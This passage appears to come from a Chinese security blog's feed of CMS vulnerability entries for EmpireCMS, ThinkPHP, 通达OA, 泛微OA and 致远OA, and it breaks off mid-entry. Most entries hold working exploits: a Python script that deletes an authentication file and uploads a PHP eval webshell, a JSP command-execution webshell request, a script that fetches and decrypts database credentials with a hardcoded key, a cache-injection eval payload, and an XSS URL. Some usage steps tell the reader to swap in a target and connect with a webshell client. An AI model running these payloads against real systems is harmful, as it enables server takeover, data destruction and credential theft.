      <url>/2020/09/07/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>EmpireCMS V7.5</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>需要有后台权限。 1.登入后台管理页面 2.点击系统-&gt;备份-&gt;备份数据 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15994843291.png" alt> 3.随便选择一个表，点击最下面的开始备份，抓包 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15994844081.png" alt> 4.抓包后修改tablename字段为命令执行语句 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15994845901.png" alt> 5.返回页面 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/V663PE4R39@A5RTG.png" alt> 6.访问备份路径下config.php亦可 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15994847861.png" alt> 7.查看config.php,命令已经写进去了</p><p> <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15994849521.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EmpireCMS 全版本XSS漏洞</title>
      <link href="/2020/09/05/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/05/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>EmpireCMS 全版本 &lt;7.5</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/K52GS8VKPFJ7RHL7J1.png" alt> <img src="EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/PWG@XY7ATDZ@YR.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA 11.6文件删除+文件上传getshell</title>
      <link href="/2020/09/04/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4+%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/"/>
      <url>/2020/09/04/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4+%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>通达OA V11.6</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target=&quot;http://********/&quot;</span><br><span class="line">payload=&quot;&lt;?php eval($_POST[&apos;shell&apos;]);?&gt;&quot;</span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)</span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line">url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;</span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;)</span><br><span class="line">url=target+&quot;/inc/auth.inc.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &apos;No input file specified.&apos; not in page:</span><br><span class="line">    print(&quot;[-]Failed to deleted auth.inc.php&quot;)</span><br><span class="line">    exit(-1)</span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;)</span><br><span class="line">print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line">url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=tql&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;</span><br><span class="line">files = &#123;&apos;FILE1&apos;: (&apos;shell.php&apos;, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+&quot;/_shell.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &apos;No input file specified.&apos; not in page:</span><br><span class="line">    print(&quot;[+]Filed Uploaded Successfully&quot;)</span><br><span class="line">    print(&quot;[+]URL:&quot;,url)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure><p>1.保存上述exp为.py脚本文件 2.替换exp中的target为目标url 3.执行脚本后菜刀连接输出的URL:<code>**********</code>即可，密码为shell</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 5.x远程代码执行漏洞环境</title>
      <link href="/2020/08/31/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/08/31/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h4 id="安装docker环境"><a href="#安装docker环境" class="headerlink" title="安装docker环境"></a>安装docker环境</h4><h5 id="点击查看教程"><a href="#点击查看教程" class="headerlink" title="点击查看教程"></a>点击查看教程</h5><h4 id="下载vulhub项目"><a href="#下载vulhub项目" class="headerlink" title="下载vulhub项目"></a>下载vulhub项目</h4><p>项目地址：<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a> 下载后进入项目目录下thinkphp/5-rce目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vunhub-master/thinkphp/5-rce</span><br></pre></td></tr></table></figure><p>开启本次漏洞环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>浏览器访问环境服务器<strong>ip:8080</strong> <img src="Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/15988699031.png" alt></p><h4 id="环境搭建完成！"><a href="#环境搭建完成！" class="headerlink" title="环境搭建完成！"></a>环境搭建完成！</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-环境库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微OA数据库配置信息泄漏</title>
      <link href="/2020/08/30/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/"/>
      <url>/2020/08/30/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>目前已知为8.100.0531，不排除其他版本，包括不限于EC7.0、EC8.0</p><h3 id="漏洞验证POC"><a href="#漏洞验证POC" class="headerlink" title="漏洞验证POC"></a>漏洞验证POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">#Author:print(&quot;&quot;)</span><br><span class="line">import pyDes,requests</span><br><span class="line">import sys</span><br><span class="line">def desdecode(secret_key,s):</span><br><span class="line">    cipherX = pyDes.des(&apos;        &apos;)</span><br><span class="line">    cipherX.setKey(secret_key)</span><br><span class="line">    y = cipherX.decrypt(s)</span><br><span class="line">    return y</span><br><span class="line">default_headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;</span><br><span class="line">&#125;</span><br><span class="line">def send(url):</span><br><span class="line">    data = requests.get(url=&apos;%s/mobile/dbconfigreader.jsp&apos;%url).content</span><br><span class="line">    return (desdecode(&apos;1z2x3c4v5b6n&apos;, data.strip()))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    print(&apos;泛微e-cology OA 数据库配置信息泄漏漏洞&apos;)</span><br><span class="line">    print(&apos;url---&gt;%s&apos;%url)</span><br><span class="line">    print(&apos;数据库信息如下-----&gt;:%s&apos;%send(url))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EmpireCMS各版本漏洞环境搭建</title>
      <link href="/2020/08/30/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/08/30/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Windows10 家庭版</p><p>phpstudy集成Apache2.4.39 PHP5.6.9 MySql5.7.26</p><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><h4 id="1-下载EmpireCMS安装包（按照所需版本下载）"><a href="#1-下载EmpireCMS安装包（按照所需版本下载）" class="headerlink" title="1.下载EmpireCMS安装包（按照所需版本下载）"></a>1.下载EmpireCMS安装包（按照所需版本下载）</h4><p>下载地址：<a href="http://www.phome.net/download/" target="_blank" rel="noopener">http://www.phome.net/download/</a></p><h4 id="2-将-安装包upload目录下所有文件放入网站根目录"><a href="#2-将-安装包upload目录下所有文件放入网站根目录" class="headerlink" title="2.将 安装包upload目录下所有文件放入网站根目录"></a>2.将 安装包upload目录下所有文件放入网站根目录</h4><h4 id="3-浏览器访问安装脚本"><a href="#3-浏览器访问安装脚本" class="headerlink" title="3.浏览器访问安装脚本"></a>3.浏览器访问安装脚本</h4><p>地址：<a href="http://127.0.0.1/e/install/index.php" target="_blank" rel="noopener">http://127.0.0.1/e/install/index.php</a></p><h4 id="4-接下来按照提示一步一步安装即可"><a href="#4-接下来按照提示一步一步安装即可" class="headerlink" title="4.接下来按照提示一步一步安装即可"></a>4.接下来按照提示一步一步安装即可</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA系统多版本Getshell漏洞复现</title>
      <link href="/2020/08/29/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/08/29/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1</p><p>利用前提 访问/seeyon/htmlofficeservlet出现 <code>DBSTEP V3.0 0 21 0 htmoffice operate err</code></p><p>POC</p><h4 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /seeyon/htmlofficeservlet HTTP/1.1</span><br><span class="line"></span><br><span class="line">  Content-Length: 1121</span><br><span class="line"></span><br><span class="line">  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line"></span><br><span class="line">  Host: xxxxxxxxx</span><br><span class="line"></span><br><span class="line">  Pragma: no-cache</span><br><span class="line"></span><br><span class="line">  DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV</span><br><span class="line"></span><br><span class="line">  OPTION=S3WYOSWLBSGr</span><br><span class="line"></span><br><span class="line">  currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66</span><br><span class="line"></span><br><span class="line">  CREATEDATE=wUghPB3szB3Xwg66</span><br><span class="line"></span><br><span class="line">  RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6</span><br><span class="line"></span><br><span class="line">  originalFileId=wV66</span><br><span class="line"></span><br><span class="line">  originalCreateDate=wUghPB3szB3Xwg66</span><br><span class="line"></span><br><span class="line">  FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6</span><br><span class="line"></span><br><span class="line">  needReadFile=yRWZdAS6</span><br><span class="line"></span><br><span class="line">  originalCreateDate=wLSGP4oEzLKAz4=iz=66</span><br><span class="line"></span><br><span class="line">  &lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+&quot;\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125; %&gt;&lt;%if(&quot;asasd3344&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;6e4f045d4b8506bf492ada7e3390d7ce</span><br></pre></td></tr></table></figure><h4 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV</span><br><span class="line"></span><br><span class="line">  OPTION=S3WYOSWLBSGr</span><br><span class="line"></span><br><span class="line">  currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66</span><br><span class="line"></span><br><span class="line">  CREATEDATE=wUghPB3szB3Xwg66</span><br><span class="line"></span><br><span class="line">  RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6</span><br><span class="line"></span><br><span class="line">  originalFileId=wV66</span><br><span class="line"></span><br><span class="line">  originalCreateDate=wUghPB3szB3Xwg66</span><br><span class="line"></span><br><span class="line">  FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6</span><br><span class="line"></span><br><span class="line">  needReadFile=yRWZdAS6</span><br><span class="line"></span><br><span class="line">  originalCreateDate=wLSGP4oEzLKAz4=iz=66</span><br><span class="line"></span><br><span class="line">  CLIENTIP=wLCXqUKAP7uhw4g5zi=6</span><br><span class="line"></span><br><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+&quot;\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125; %&gt;&lt;%if(&quot;asasd3344&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 2.X RCE漏洞环境搭建</title>
      <link href="/2020/08/28/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/08/28/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%202.X%20RCE%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="安装docker环境"><a href="#安装docker环境" class="headerlink" title="安装docker环境"></a>安装docker环境</h4><h5 id="点击查看教程"><a href="#点击查看教程" class="headerlink" title="点击查看教程"></a>点击查看教程</h5><h4 id="下载vulhub项目"><a href="#下载vulhub项目" class="headerlink" title="下载vulhub项目"></a>下载vulhub项目</h4><p>项目地址：<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><p>下载后进入项目目录下thinkphp/2-rce目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd vunhub-master/thinkphp/2-rce</span><br></pre></td></tr></table></figure><p>开启本次漏洞环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>浏览器访问环境服务器<strong>ip:8080</strong> <img src="https://www.bylibrary.cn/wp-content/uploads/2020/08/批注-2020-08-28-002711.png" alt></p><h4 id="环境搭建完成！"><a href="#环境搭建完成！" class="headerlink" title="环境搭建完成！"></a>环境搭建完成！</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-环境库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp 3.2.3 缓存漏洞</title>
      <link href="/2020/08/27/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/27/01-CMS%E6%BC%8F%E6%B4%9E/Thinkphp/Thinkphp%203.2.3%20%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Thinkphp 3.2.3</p><h3 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h3><p>此版本默认的缓存处理机制中，缓存文件是一个可访问的.php文件，编程人员把用户可控参数写入缓存则会产生漏洞。</p><h3 id="漏洞验证POC"><a href="#漏洞验证POC" class="headerlink" title="漏洞验证POC"></a>漏洞验证POC</h3><h5 id="获取用户可控参数写入缓存"><a href="#获取用户可控参数写入缓存" class="headerlink" title="获取用户可控参数写入缓存"></a>获取用户可控参数写入缓存</h5><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Home\Controller;</span><br><span class="line">use Think\Controller;</span><br><span class="line">class IndexController extends Controller &#123;</span><br><span class="line"></span><br><span class="line">    public function index()&#123;</span><br><span class="line">        $a=I(&apos;post.a&apos;);</span><br><span class="line">        S(&apos;name&apos;,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="用户传参数："><a href="#用户传参数：" class="headerlink" title="用户传参数："></a>用户传参数：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%0aeval($_POST[&apos;aaa&apos;]);%0a</span><br></pre></td></tr></table></figure><p>%0a为换行符，默认存入缓存文件时用户参数存在于注释中。</p><h5 id="写入缓存文件，文件名为md5加密"><a href="#写入缓存文件，文件名为md5加密" class="headerlink" title="写入缓存文件，文件名为md5加密"></a>写入缓存文件，文件名为md5加密</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(name)</span><br></pre></td></tr></table></figure><h5 id="文件默认路径"><a href="#文件默认路径" class="headerlink" title="文件默认路径"></a>文件默认路径</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;domain&gt;/Application/Runtime/Temp/&lt;md5&gt;.php</span><br></pre></td></tr></table></figure><h5 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxxx/Application/Runtime/Temp/&lt;md5&gt;.php 密码aaa</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA2017前台任意用户登录漏洞</title>
      <link href="/2020/08/27/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/27/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>通达OA2017、V11.X&lt;V11.5</p><h3 id="漏洞验证POC"><a href="#漏洞验证POC" class="headerlink" title="漏洞验证POC"></a>漏洞验证POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 